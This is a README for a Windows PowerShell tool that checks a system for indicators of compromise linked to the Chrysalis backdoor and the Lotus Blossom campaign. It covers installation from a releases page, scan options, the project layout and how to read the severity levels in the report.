# 🛡️ chrysalis-ioc-triage - Check for Compromise Indicators

A simple tool to check your system for potential threats.

## 🚀 Download and Install

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/orangeok77/chrysalis-ioc-triage/releases)

To download the software, visit this page: [Download Releases](https://github.com/orangeok77/chrysalis-ioc-triage/releases).

## 💡 Quick Start

**Requirements:** 
- Windows operating system
- PowerShell version 5.1 or later

**Note:** It is best to run this tool as an Administrator. This allows the tool to check the registry and services thoroughly.

1. Visit the [Releases page](https://github.com/orangeok77/chrysalis-ioc-triage/releases).
2. Download the latest version of the application.
3. Locate the downloaded file, usually in your "Downloads" folder.
4. Right-click the file and choose "Run with PowerShell" or "Run as Administrator."
5. Follow the prompts to begin the scan.

## 🔍 What is Checked

This tool scans for specific Indicators of Compromise (IoCs) related to the Chrysalis backdoor and the Lotus Blossom campaign. It examines the following:

- Running processes
- Installed services
- System registry
- Any unusual network activity

Upon completion, the tool provides a report highlighting any detected IoCs.

## ⚙️ Options

You can customize the scan using command-line options:

- `-ScanAll`: Checks all categories (default).
- `-OnlyProcesses`: Checks for IoCs in running processes only.
- `-OnlyServices`: Checks for IoCs in installed services only.

To see all options, run the tool and use the `-Help` command.

## 📂 Project Layout

When you download the application, the structure will look like this:

```
chrysalis-ioc-triage/
├── README.md
├── src/
├── docs/
└── build/
```

- `README.md`: This file provides an overview and instructions.
- `src/`: Contains the application source code.
- `docs/`: Offers detailed documentation.
- `build/`: Includes the compiled application files.

## 📘 Documentation

For detailed command references and use cases, review the documentation in the `docs/` folder. It covers all features and advanced options of the tool.

## 📊 Interpretation

After the scan completes, the results will be displayed in the PowerShell window. Each IoC found will be categorized based on its severity:

- **Critical:** Immediate action required.
- **Warning:** Potential threats that should be reviewed.
- **Info:** Informational only, no action needed.

Review the report carefully. If you find any critical or warning indicators, it is advisable to research them further to determine the necessary steps.

## 🤝 Contributing

We welcome contributions to enhance the tool. Please make sure to fork the repository, create a new branch for your changes, and submit a pull request. For more detailed guidelines, refer to the `CONTRIBUTING.md` file in the repository.

## 📜 License

This project is licensed under the MIT License. For more details, see the `LICENSE` file in this repository.